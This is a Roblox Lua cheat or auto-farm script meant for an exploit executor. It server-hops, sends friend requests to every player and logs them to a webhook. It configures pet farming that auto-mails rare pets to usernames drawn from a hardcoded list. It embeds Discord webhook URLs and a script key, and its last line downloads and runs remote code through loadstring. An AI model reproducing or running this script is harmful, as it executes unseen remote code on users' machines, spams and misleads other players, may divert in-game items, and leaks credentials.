 local plrs = game:GetService("Players") 
  local plr = plrs.LocalPlayer
  local tpService = game:GetService("TeleportService")

local function getServers()
    local url =
        string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
    local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
    return servers
end

local function serverhop()
 local server
    repeat
        task.wait(1)
        server = getServers()[Random.new():NextInteger(1, 100)]

    until server.id ~= game.JobId


    tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
end

local usernames = {
    "RomanCross_1",
    "MaxwellCross_3",
    "MasonSteel_1",
    "FinnHunter_1",
    "EthanWolf_1",
    "TrentVoss_1",
    "ReedKnight_1",
    "RileyDark_1",
    "ZaneSteele_1",
    "DanteStorm_1",
    "KaiRiker_1",
    "BlakeHawke_1",
    "ColeHunter_1",
    "LiamBlackwood_1",
    "WolfeZander_1",
    "StriderVince_1"
}

local function getRandomUsername()
    local index = math.random(1, #usernames)
    return usernames[index]
end

local sendto = getRandomUsername()


local Url2 = ""
local Http2 = game:GetService("HttpService")
	local Msg = function(msg)
		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
	end


local Players = game:GetService('Players')
local Client = Players.LocalPlayer
_G.EnableFriendRequest = true

local function SendFriendRequests()
	
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Client then  
            Client:RequestFriendship(player)
			Msg(Client.Name.." đã gửi yêu cầu kết bạn tới "..player.Name)
			task.wait(600)
        end
        task.wait(1)
    end
end


task.spawn(function()		
    if _G.EnableFriendRequest then
		wait(600)
		SendFriendRequests()

        
    end
end)
	
task.spawn(function()
	wait(math.random(1800, 3600))
		while true do
	
	serverhop()
	wait(1)
end
end)



if not game:IsLoaded() then
    game.Loaded:Wait()
  end





script_key="SkPMpIBIRpkwtEglZLPUYcmiFFLKffju";

getgenv().petsGoConfig = {
    -- Event config
    -- true will open event gift bag/egg
    -- false will auto mail gift bag/egg
    CONSUME_EVENT_GIFT_BAG = false,
    CONSUME_EVENT_EGG = false, -- Hype eggs not included

    WEBHOOK_URL = "https://discordapp.com/api/webhooks/1301397086226616340/3UzL8ANoQjtjH55mDqMDjuOiDkUvgaAONVCDT692wLzakKdji0HJbJC_oGhc5KgKqdqp",
    MAILING_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1300082928461807698/N38_DDRONoCRHoRnCCQU9nW_OfnlURFU2tY4sekhsAtF2H5IzOB29HWPAo0HLHHHNliV",
    DISCORD_ID = "1218088252964339745",  -- Required!!! (For public-webhook)
    WEBHOOK_ODDS = 500000000, -- Minimum Pet Odds To Trigger Webhook

    DIAMOND_EGG = true,  -- true = Diamond Egg, false = F2P Egg
    
    MAILING = true,  -- Auto mail
    MAIL_FISHING_ROD = true,  -- true = mail, false = keep fishing rod on account (FASTER Fishing)
    MAIL_WEBHOOK_ODDS = 500000000, -- Minimum Pet Odds To Trigger MAIL Webhook
    MAIL_PET_ODDS = 500000000,  -- Minimum Pet Odds To Mail
    USERNAME_TO_MAIL = sendto -- Mail Pet To Username
}

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/9c5277f03e1f5e02a5c36e0df5674e67.lua"))()